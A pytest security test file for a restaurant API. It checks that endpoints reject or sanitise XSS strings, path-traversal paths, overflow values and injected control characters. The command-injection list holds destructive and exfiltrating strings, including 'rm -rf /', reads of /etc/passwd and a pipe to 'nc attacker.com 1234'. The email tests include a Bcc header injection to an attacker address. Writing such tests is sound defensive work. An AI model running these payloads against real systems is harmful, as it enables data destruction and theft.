"""
Input Validation Security Tests
"""
import pytest
from httpx import AsyncClient
from app.main import app
from tests.fixtures.database import test_db, test_restaurant
from tests.fixtures.auth import auth_headers


@pytest.mark.asyncio
class TestInputValidationSecurity:
    """Test input validation and sanitization"""
    
    async def test_xss_prevention_in_text_fields(self, test_db, test_restaurant, auth_headers):
        """Test XSS prevention in text input fields"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            '<img src=x onerror="alert(\'XSS\')">',
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//",
            '"><script>alert(String.fromCharCode(88,83,83))</script>',
        ]
        
        async with AsyncClient(app=app, base_url="http://test") as client:
            for payload in xss_payloads:
                # Test various endpoints that accept text input
                test_data = [
                    ("/api/v1/products", {
                        "name": payload,
                        "description": payload,
                        "category_id": "test",
                        "price": 10.00
                    }),
                    ("/api/v1/orders", {
                        "notes": payload,
                        "customer_name": payload,
                        "table_number": "1"
                    }),
                    ("/api/v1/customers", {
                        "name": payload,
                        "email": f"test@{payload}.com",
                        "notes": payload
                    }),
                ]
                
                for endpoint, data in test_data:
                    response = await client.post(
                        endpoint,
                        json=data,
                        headers=auth_headers
                    )
                    
                    # Should either sanitize or reject
                    if response.status_code == 200:
                        result = response.json()
                        # Check that XSS payload was sanitized
                        for key, value in result.items():
                            if isinstance(value, str):
                                assert "<script>" not in value
                                assert "javascript:" not in value
                                assert "onerror=" not in value
    
    async def test_command_injection_prevention(self, auth_headers):
        """Test command injection prevention"""
        command_payloads = [
            "test; rm -rf /",
            "test && cat /etc/passwd",
            "test | nc attacker.com 1234",
            "`whoami`",
            "$(cat /etc/passwd)",
            "test\nrm -rf /",
        ]
        
        async with AsyncClient(app=app, base_url="http://test") as client:
            for payload in command_payloads:
                # Test file upload endpoint
                response = await client.post(
                    "/api/v1/upload",
                    files={"file": (payload, b"test content", "text/plain")},
                    headers=auth_headers
                )
                
                # Should handle safely
                assert response.status_code in [200, 400, 422]
    
    async def test_path_traversal_prevention(self, auth_headers):
        """Test path traversal attack prevention"""
        path_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
        ]
        
        async with AsyncClient(app=app, base_url="http://test") as client:
            for payload in path_payloads:
                # Test file access endpoints
                response = await client.get(
                    f"/api/v1/files/{payload}",
                    headers=auth_headers
                )
                
                # Should block path traversal
                assert response.status_code in [400, 404]
    
    async def test_numeric_overflow_prevention(self, test_restaurant, auth_headers):
        """Test numeric overflow prevention"""
        overflow_values = [
            2**31,  # Max 32-bit int + 1
            2**63,  # Max 64-bit int + 1
            -2**31 - 1,  # Min 32-bit int - 1
            float('inf'),
            float('-inf'),
            float('nan'),
            "999999999999999999999999999999999999999999",
        ]
        
        async with AsyncClient(app=app, base_url="http://test") as client:
            for value in overflow_values:
                # Test price fields
                response = await client.post(
                    "/api/v1/products",
                    json={
                        "name": "Test Product",
                        "price": value,
                        "category_id": "test",
                        "restaurant_id": test_restaurant.id
                    },
                    headers=auth_headers
                )
                
                # Should reject or cap values
                assert response.status_code in [400, 422]
    
    async def test_special_character_handling(self, auth_headers):
        """Test special character handling"""
        special_chars = [
            "test\x00null",  # Null byte
            "test\r\ninjection",  # CRLF
            "test\u202e\u202dReversed",  # Unicode direction override
            "test\ufeff",  # Zero-width space
            "test\x1b[31mred",  # ANSI escape codes
        ]
        
        async with AsyncClient(app=app, base_url="http://test") as client:
            for char_input in special_chars:
                response = await client.post(
                    "/api/v1/products",
                    json={
                        "name": char_input,
                        "description": char_input,
                        "price": 10.00
                    },
                    headers=auth_headers
                )
                
                # Should handle safely
                if response.status_code == 200:
                    result = response.json()
                    # Verify special chars were handled
                    assert "\x00" not in result.get("name", "")
                    assert "\r\n" not in result.get("name", "")
    
    async def test_email_validation(self, auth_headers):
        """Test email validation"""
        invalid_emails = [
            "not-an-email",
            "@example.com",
            "user@",
            "user@@example.com",
            "user@example",
            "<script>@example.com",
            "user+test@example.com\r\nBcc: attacker@evil.com",
        ]
        
        async with AsyncClient(app=app, base_url="http://test") as client:
            for email in invalid_emails:
                response = await client.post(
                    "/api/v1/customers",
                    json={
                        "name": "Test User",
                        "email": email
                    },
                    headers=auth_headers
                )
                
                # Should reject invalid emails
                assert response.status_code in [400, 422]